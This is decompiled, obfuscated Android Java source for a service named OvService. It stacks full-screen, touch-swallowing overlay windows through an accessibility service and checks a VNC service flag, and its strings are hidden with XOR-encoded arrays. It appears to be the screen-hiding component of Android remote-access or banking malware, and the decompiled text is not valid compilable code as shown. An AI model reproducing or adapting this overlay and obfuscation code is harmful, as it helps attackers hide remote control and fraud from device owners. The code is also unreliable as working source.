package com.mistral.jon.services;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.DisplayMetrics;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager.LayoutParams;
import android.view.WindowManager;
import com.mistral.jon.services.a11y.AcService;
import java.util.ArrayList;
import java.util.List;
import z.ayp;
import z.bbe;
import z.bcq;

public class OvService extends Service {
    private static final String a = "OvService";
    private static long[] a;
    private int a;
    private Context a;
    private WindowManager a;
    private final List a;
    private bbe a;
    private boolean a;
    private static final String b;
    private int b;

    static {
        long[] arr_v = new long[0x7D];
        OvService.a = arr_v;
        arr_v[0] = 0x344FCDE4L;
        arr_v[1] = 0x7238F5D6L;
        arr_v[2] = 0x628F9F0DL;
        arr_v[3] = 0x147015FDL;
        arr_v[4] = 160700843L;
        arr_v[5] = 928263870L;
        arr_v[6] = 0x1ACD4A6AL;
        arr_v[7] = 1505404L;
        arr_v[8] = 0x12AE7DC1L;
        arr_v[9] = 0x4B25E507L;
        arr_v[10] = -657903987L;
        arr_v[11] = 0x4098F13BL;
        arr_v[12] = 0xFFFFFFFF91FAF31CL;
        arr_v[13] = 627578290L;
        arr_v[14] = 0xFFFFFFFFD53D9F4DL;
        arr_v[15] = 0x13F297A4L;
        arr_v[16] = 0xFFFFFFFFB754C3F9L;
        arr_v[17] = 0x64969D31L;
        arr_v[18] = -580032732L;
        arr_v[19] = 0x2E264A29L;
        arr_v[20] = 2038092600L;
        arr_v[21] = 0x337583F0L;
        arr_v[22] = 1126870607L;
        arr_v[23] = 0x3BFE0CEFL;
        arr_v[24] = 1233520007L;
        arr_v[25] = 0x300CD39L;
        arr_v[26] = -389530390L;
        arr_v[27] = 1615007093L;
        arr_v[28] = 49208507L;
        arr_v[29] = 0x3315753FL;
        arr_v[30] = 1586945320L;
        arr_v[0x1F] = 1388021173L;
        arr_v[0x20] = 0x29F110CL;
        arr_v[33] = 0xFFFFFFFFCECC17E9L;
        arr_v[34] = 202568840L;
        arr_v[35] = 0x2A5159F3L;
        arr_v[36] = 0x209CAF32L;
        arr_v[37] = 0x7E36DB65L;
        arr_v[38] = -1431093506L;
        arr_v[39] = 0x694F66B1L;
        arr_v[40] = 0x78EAF7C5L;
        arr_v[41] = 241046508L;
        arr_v[42] = 41290307L;
        arr_v[43] = -424223061L;
        arr_v[44] = 0x312C0D60L;
        arr_v[45] = -1497055898L;
        arr_v[46] = 0x5D245638L;
        arr_v[0x2F] = 0xFFFFFFFFA4604367L;
        arr_v[0x30] = 0x34AF1FFBL;
        arr_v[49] = 0xFFFFFFFFBE783ED0L;
        arr_v[50] = 0x1A9AFE6AL;
        arr_v[51] = 0x5D51B11FL;
        arr_v[52] = 0x4A5FE9B1L;
        arr_v[53] = -978099041L;
        arr_v[54] = 1554697101L;
        arr_v[55] = 0x24751EC5L;
        arr_v[56] = 0x114770F1L;
        arr_v[57] = 1001580847L;
        arr_v[58] = 0x1CC556E1L;
        arr_v[59] = 0x590B2632L;
        arr_v[60] = 505093176L;
        arr_v[61] = 1693003385L;
        arr_v[62] = 0x2144977AL;
        arr_v[0x3F] = 0x5961F07EL;
        arr_v[0x40] = 500584332L;
        arr_v[65] = 0xA6AF7A2L;
        arr_v[66] = 0x194B1B02L;
        arr_v[67] = 0x559CC1A5L;
        arr_v[68] = 0x4FABE3DCL;
        arr_v[69] = 0x4B42B7F0L;
        arr_v[70] = 0x66278EE7L;
        arr_v[71] = 0x9D50F01L;
        arr_v[72] = 0x16DFE40AL;
        arr_v[73] = 0x9325633L;
        arr_v[74] = 0x71EE5387L;
        arr_v[75] = 0x483D2F8FL;
        arr_v[76] = 0x206F2F51L;
        arr_v[77] = 0x5DADAAE3L;
        arr_v[78] = 472255030L;
        arr_v[0x4F] = 1683810520L;
        arr_v[80] = 0x1FF1A32FL;
        arr_v[81] = -1076189405L;
        arr_v[82] = 0xFFFFFFFFDCEFF098L;
        arr_v[83] = 0x1789AB28L;
        arr_v[84] = 0x4BFCAC09L;
        arr_v[85] = 1526570097L;
        arr_v[86] = 0xFFFFFFFFF79BF133L;
        arr_v[87] = 0xFFFFFFFFFF4007E9L;
        arr_v[88] = -1201087839L;
        arr_v[89] = -947168052L;
        arr_v[90] = 0xFFFFFFFFF49A0EFBL;
        arr_v[91] = 0x64A11281L;
        arr_v[92] = 0xFFFFFFFF9ED360A4L;
        arr_v[93] = 1397478980L;
        arr_v[94] = 0x1A2F8072L;
        arr_v[0x5F] = 2100275837L;
        arr_v[0x60] = 0x6FD404FL;
        arr_v[97] = 0x6424A00BL;
        arr_v[98] = 1023101000L;
        arr_v[99] = 0x597E1DCL;
        arr_v[100] = -1583908404L;
        arr_v[101] = 0xFFFFFFFF9EBAED2BL;
        arr_v[102] = 0xFFFFFFFFB9ABA58EL;
        arr_v[103] = -1081781107L;
        arr_v[104] = 1506045207L;
        arr_v[105] = 0x3AC8C224L;
        arr_v[106] = 308718460L;
        arr_v[107] = 0x1C7A0E8AL;
        arr_v[108] = 1423408408L;
        arr_v[109] = 0x24BB601EL;
        arr_v[110] = 0x4865F588L;
        arr_v[0x6F] = 717462490L;
        arr_v[0x70] = 967013955L;
        arr_v[0x71] = 0x4BFDD0D8L;
        arr_v[0x72] = -1463624260L;
        arr_v[0x73] = 0xFFFFFFFFF8502790L;
        arr_v[0x74] = -1461154202L;
        arr_v[0x75] = 1138305945L;
        arr_v[0x76] = -1620463800L;
        arr_v[0x77] = 0xFFFFFFFFB61ED0CBL;
        arr_v[120] = 1016817274L;
        arr_v[0x79] = 0xFFFFFFFF8B5049D2L;
        arr_v[0x7A] = 0x4AEBD1F2L;
        arr_v[0x7B] = 0x4E3A7312L;
        arr_v[0x7C] = 2102663875L;
        long[] arr_v1 = OvService.a;
        byte[] arr_b = new byte[((int)arr_v1[56]) ^ 0x114770D1];
        arr_b[((int)arr_v1[0]) ^ 0x344FCDE4] = ((int)arr_v1[0x72]) ^ 0x573D2228;
        arr_b[((int)arr_v1[2]) ^ 0x628F9F0C] = ((int)arr_v1[0x73]) ^ 0x7AFD834;
        arr_b[((int)arr_v1[1]) ^ 0x7238F5D4] = ((int)arr_v1[0x74]) ^ 0x571771F5;
        arr_b[((int)arr_v1[3]) ^ 0x147015FE] = ((int)arr_v1[20]) ^ 2038092576;
        arr_b[4] = ((int)arr_v1[54]) ^ 1554697107;
        arr_b[5] = ((int)arr_v1[0x75]) ^ 1138306041;
        arr_b[((int)arr_v1[11]) ^ 0x4098F13D] = ((int)arr_v1[66]) ^ 0x194B1B25;
        arr_b[((int)arr_v1[13]) ^ 0x256815B5] = ((int)arr_v1[89]) ^ 947168043;
        arr_b[((int)arr_v1[15]) ^ 0x13F297AC] = ((int)arr_v1[0x76]) ^ 0x609650EF;
        arr_b[((int)arr_v1[17]) ^ 0x64969D38] = ((int)arr_v1[77]) ^ 0x5DADAAB1;
        arr_b[((int)arr_v1[19]) ^ 0x2E264A23] = ((int)arr_v1[33]) ^ 0x3133E81D;
        arr_b[((int)arr_v1[21]) ^ 0x337583FB] = ((int)arr_v1[33]) ^ 0x3133E81D;
        arr_b[((int)arr_v1[23]) ^ 1006505187] = ((int)arr_v1[0x77]) ^ 0x49E12F55;
        arr_b[((int)arr_v1[25]) ^ 0x300CD34] = ((int)arr_v1[120]) ^ 0x3C9B660D;
        arr_b[((int)arr_v1[27]) ^ 1615007099] = ((int)arr_v1[99]) ^ 0x597E1B4;
        arr_b[((int)arr_v1[29]) ^ 0x33157530] = ((int)arr_v1[0x79]) ^ 0x74AFB663;
        arr_b[((int)arr_v1[5]) ^ 0x37542EAE] = ((int)arr_v1[83]) ^ 0x1789AB1F;
        arr_b[((int)arr_v1[0x20]) ^ 0x29F111D] = ((int)arr_v1[99]) ^ 0x597E1B4;
        arr_b[((int)arr_v1[34]) ^ 0xC12F49A] = ((int)arr_v1[0x7A]) ^ 0x4AEBD1AA;
        arr_b[((int)arr_v1[36]) ^ 0x209CAF21] = ((int)arr_v1[0x1F]) ^ 0x52BB85FE;
        arr_b[((int)arr_v1[37]) ^ 0x7E36DB71] = ((int)arr_v1[57]) ^ 1001580909;
        arr_b[((int)arr_v1[35]) ^ 709974502] = ((int)arr_v1[105]) ^ 986235509;
        arr_b[((int)arr_v1[40]) ^ 0x78EAF7D3] = ((int)arr_v1[72]) ^ 0x16DFE453;
        arr_b[((int)arr_v1[41]) ^ 0xE5E13FB] = ((int)arr_v1[105]) ^ 986235509;
        arr_b[((int)arr_v1[20]) ^ 2038092576] = ((int)arr_v1[0x7B]) ^ 0x4E3A7366;
        arr_b[((int)arr_v1[44]) ^ 0x312C0D79] = ((int)arr_v1[51]) ^ 1565634890;
        arr_b[((int)arr_v1[46]) ^ 0x5D245622] = ((int)arr_v1[0x7C]) ^ 2102663812;
        arr_b[((int)arr_v1[0x30]) ^ 0x34AF1FE0] = ((int)arr_v1[30]) ^ 1586945350;
        arr_b[((int)arr_v1[50]) ^ 0x1A9AFE76] = ((int)arr_v1[108]) ^ 0x54D77D20;
        arr_b[((int)arr_v1[52]) ^ 0x4A5FE9AC] = ((int)arr_v1[0x70]) ^ 967013900;
        arr_b[((int)arr_v1[54]) ^ 1554697107] = ((int)arr_v1[99]) ^ 0x597E1B4;
        arr_b[((int)arr_v1[55]) ^ 0x24751EDA] = ((int)arr_v1[93]) ^ 0x534BD617;
        OvService.b = "aa";
    }

    public OvService() {
        this.a = new ArrayList();
        this.a = null;
        long[] arr_v = OvService.a;
        this.a = ((int)arr_v[0]) ^ 0x344FCDE4;
        this.b = ((int)arr_v[1]) ^ 0x7238F5D4;
    }

    private View a() {
        Context context0 = this.a;
        if(context0 == null) {
            context0 = this;
        }
        View view0 = new View(context0);
        view0.setClickable(((boolean)(((int)OvService.a[0]) ^ 0x344FCDE4)));
        view0.setOnTouchListener((View view0, MotionEvent motionEvent0) -> ((int)OvService.a[0]) ^ 0x344FCDE4);
        view0.setBackgroundColor(((int)OvService.a[81]) ^ 1088071459);
        view0.setSystemUiVisibility(0x1707);
        view0.setAlpha(1.0f);
        return view0;
    }

    private WindowManager.LayoutParams a() {
        WindowManager.LayoutParams windowManager$LayoutParams0 = new WindowManager.LayoutParams(-1, -1, this.a, 1720, ((int)OvService.a[82]) ^ 0x23100F65);
        DisplayMetrics displayMetrics0 = new DisplayMetrics();
        this.a.getDefaultDisplay().getMetrics(displayMetrics0);
        windowManager$LayoutParams0.width = displayMetrics0.widthPixels;
        windowManager$LayoutParams0.height = displayMetrics0.heightPixels + 2000;
        windowManager$LayoutParams0.alpha = 0.5f;
        return windowManager$LayoutParams0;
    }

    private void a() {
        if(this.a.size() == 0) {
            try {
                for(int v = ((int)OvService.a[0]) ^ 0x344FCDE4; v < this.b; ++v) {
                    View view0 = this.a();
                    WindowManager.LayoutParams windowManager$LayoutParams0 = this.a();
                    this.a.addView(view0, windowManager$LayoutParams0);
                    this.a.add(view0);
                }
                ayp.a().a("Showed", "OvService");
            }
            catch(Exception exception0) {
                ayp.a().a(exception0.toString(), "OvService", ((int)OvService.a[11]) ^ 0x4098F13D);
                -..Lambda.OvService.Zf0cF0OZpkvgHbNeDm6l-CAn3Xo -$$Lambda$OvService$Zf0cF0OZpkvgHbNeDm6l-CAn3Xo0 = (View view0) -> this.a.removeView(view0);
                this.a.forEach(-$$Lambda$OvService$Zf0cF0OZpkvgHbNeDm6l-CAn3Xo0);
                this.a.clear();
            }
        }
    }

    // Detected as a lambda implementation
    private void a(View view0) [...]

    // Detected as a lambda implementation
    private static boolean a(View view0, MotionEvent motionEvent0) [...]

    private void b() {
        if(this.a.size() > 0) {
            -..Lambda.OvService.vVEFa805mRkaeO21Vrt8vOfAgS0 -$$Lambda$OvService$vVEFa805mRkaeO21Vrt8vOfAgS00 = (View view0) -> this.a.removeView(view0);
            this.a.forEach(-$$Lambda$OvService$vVEFa805mRkaeO21Vrt8vOfAgS00);
            this.a.clear();
            ayp.a().a("Hided", "OvService");
        }
    }

    // Detected as a lambda implementation
    private void b(View view0) [...]

    @Override  // android.app.Service
    public IBinder onBind(Intent intent0) {
        long[] arr_v = OvService.a;
        byte[] arr_b = new byte[((int)arr_v[4]) ^ 160700827];
        arr_b[((int)arr_v[0]) ^ 0x344FCDE4] = ((int)arr_v[5]) ^ 0x37542EAE;
        arr_b[((int)arr_v[2]) ^ 0x628F9F0C] = ((int)arr_v[6]) ^ 0x1ACD4A0E;
        arr_b[((int)arr_v[1]) ^ 0x7238F5D4] = ((int)arr_v[7]) ^ 0x16F849;
        arr_b[((int)arr_v[3]) ^ 0x147015FE] = ((int)arr_v[8]) ^ 0x12AE7DA4;
        arr_b[4] = ((int)arr_v[9]) ^ 1260774697;
        arr_b[5] = ((int)arr_v[10]) ^ 657903896;
        arr_b[((int)arr_v[11]) ^ 0x4098F13D] = ((int)arr_v[12]) ^ 0x6E050C94;
        arr_b[((int)arr_v[13]) ^ 0x256815B5] = ((int)arr_v[14]) ^ 0x2AC260D0;
        arr_b[((int)arr_v[15]) ^ 0x13F297AC] = ((int)arr_v[16]) ^ 0x48AB3C77;
        arr_b[((int)arr_v[17]) ^ 0x64969D38] = ((int)arr_v[18]) ^ 580032758;
        arr_b[((int)arr_v[19]) ^ 0x2E264A23] = ((int)arr_v[20]) ^ 2038092576;
        arr_b[((int)arr_v[21]) ^ 0x337583FB] = ((int)arr_v[22]) ^ 0x432AAE07;
        arr_b[((int)arr_v[23]) ^ 1006505187] = ((int)arr_v[24]) ^ 1233520034;
        arr_b[((int)arr_v[25]) ^ 0x300CD34] = ((int)arr_v[26]) ^ 389530370;
        arr_b[((int)arr_v[27]) ^ 1615007099] = ((int)arr_v[28]) ^ 49208535;
        arr_b[((int)arr_v[29]) ^ 0x33157530] = ((int)arr_v[30]) ^ 1586945350;
        arr_b[((int)arr_v[5]) ^ 0x37542EAE] = ((int)arr_v[0x1F]) ^ 0x52BB85FE;
        arr_b[((int)arr_v[0x20]) ^ 0x29F111D] = ((int)arr_v[33]) ^ 0x3133E81D;
        arr_b[((int)arr_v[34]) ^ 0xC12F49A] = ((int)arr_v[35]) ^ 709974502;
        arr_b[((int)arr_v[36]) ^ 0x209CAF21] = ((int)arr_v[21]) ^ 0x337583FB;
        arr_b[((int)arr_v[37]) ^ 0x7E36DB71] = ((int)arr_v[38]) ^ 1431093575;
        arr_b[((int)arr_v[35]) ^ 709974502] = ((int)arr_v[39]) ^ 0x694F6685;
        arr_b[((int)arr_v[40]) ^ 0x78EAF7D3] = ((int)arr_v[25]) ^ 0x300CD34;
        arr_b[((int)arr_v[41]) ^ 0xE5E13FB] = ((int)arr_v[42]) ^ 0x2760A60;
        arr_b[((int)arr_v[20]) ^ 2038092576] = ((int)arr_v[43]) ^ 424223012;
        arr_b[((int)arr_v[44]) ^ 0x312C0D79] = ((int)arr_v[45]) ^ 1497055876;
        arr_b[((int)arr_v[46]) ^ 0x5D245622] = ((int)arr_v[0x2F]) ^ 0x5B9FBCBA;
        arr_b[((int)arr_v[0x30]) ^ 0x34AF1FE0] = ((int)arr_v[49]) ^ 1099415841;
        arr_b[((int)arr_v[50]) ^ 0x1A9AFE76] = ((int)arr_v[51]) ^ 1565634890;
        arr_b[((int)arr_v[52]) ^ 0x4A5FE9AC] = ((int)arr_v[53]) ^ 978098968;
        arr_b[((int)arr_v[54]) ^ 1554697107] = ((int)arr_v[43]) ^ 424223012;
        arr_b[((int)arr_v[55]) ^ 0x24751EDA] = ((int)arr_v[24]) ^ 1233520034;
        arr_b[((int)arr_v[56]) ^ 0x114770D1] = ((int)arr_v[57]) ^ 1001580909;
        arr_b[((int)arr_v[58]) ^ 0x1CC556C0] = ((int)arr_v[59]) ^ 0x590B260B;
        arr_b[((int)arr_v[60]) ^ 505093146] = ((int)arr_v[61]) ^ 1693003272;
        arr_b[((int)arr_v[42]) ^ 0x2760A60] = ((int)arr_v[62]) ^ 0x21449737;
        arr_b[((int)arr_v[0x3F]) ^ 0x5961F05A] = ((int)arr_v[0x1F]) ^ 0x52BB85FE;
        arr_b[((int)arr_v[24]) ^ 1233520034] = ((int)arr_v[0x40]) ^ 500584423;
        arr_b[((int)arr_v[65]) ^ 0xA6AF784] = ((int)arr_v[61]) ^ 1693003272;
        arr_b[((int)arr_v[66]) ^ 0x194B1B25] = ((int)arr_v[67]) ^ 0x559CC1F2;
        arr_b[((int)arr_v[68]) ^ 0x4FABE3F4] = ((int)arr_v[69]) ^ 0x4B42B796;
        arr_b[((int)arr_v[70]) ^ 0x66278ECE] = ((int)arr_v[62]) ^ 0x21449737;
        arr_b[((int)arr_v[71]) ^ 0x9D50F2B] = ((int)arr_v[72]) ^ 0x16DFE453;
        arr_b[((int)arr_v[73]) ^ 0x9325618] = ((int)arr_v[74]) ^ 1911444430;
        arr_b[((int)arr_v[75]) ^ 0x483D2FA3] = ((int)arr_v[61]) ^ 1693003272;
        arr_b[((int)arr_v[76]) ^ 0x206F2F7C] = ((int)arr_v[77]) ^ 0x5DADAAB1;
        arr_b[((int)arr_v[9]) ^ 1260774697] = ((int)arr_v[78]) ^ 0x1C260A7A;
        arr_b[((int)arr_v[0x4F]) ^ 0x645CE8F7] = ((int)arr_v[80]) ^ 0x1FF1A37B;
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override  // android.app.Service
    public void onCreate() {
        super.onCreate();
        this.a = (WindowManager)this.getSystemService(WindowManager.class);
        this.a = new bbe(bcq.a(this));
    }

    @Override  // android.app.Service
    public void onDestroy() {
        super.onDestroy();
        this.b();
        long[] arr_v = OvService.a;
        this.a = ((int)arr_v[0]) ^ 0x344FCDE4;
        this.a = null;
        this.a.a(((boolean)(((int)arr_v[0]) ^ 0x344FCDE4)));
    }

    @Override  // android.app.Service
    public int onStartCommand(Intent intent0, int v, int v1) {
        int v4;
        int v3;
        if(VncService.b) {
            this.stopSelf();
            return 1;
        }
        if(!this.a && intent0 != null) {
            this.a.a(((boolean)1));
            long[] arr_v = OvService.a;
            this.a = ((int)arr_v[2]) ^ 0x628F9F0C;
            int v2 = intent0.getBooleanExtra("aa", ((boolean)(((int)arr_v[2]) ^ 0x628F9F0C))) ? 0x7F6 : 0x7F0;
            this.a = v2;
            if(v2 == 0x7F0) {
                this.a = AcService.a;
                v3 = 0x147015FD;
                v4 = 0x147015FE;
            }
            else {
                this.a = null;
                v3 = 0x7238F5D6;
                v4 = 0x7238F5D4;
            }
            this.b = v3 ^ v4;
            Context context0 = this.a;
            if(context0 != null) {
                this.a = (WindowManager)context0.getSystemService("window");
            }
            this.a();
            return 1;
        }
        return 1;
    }
}

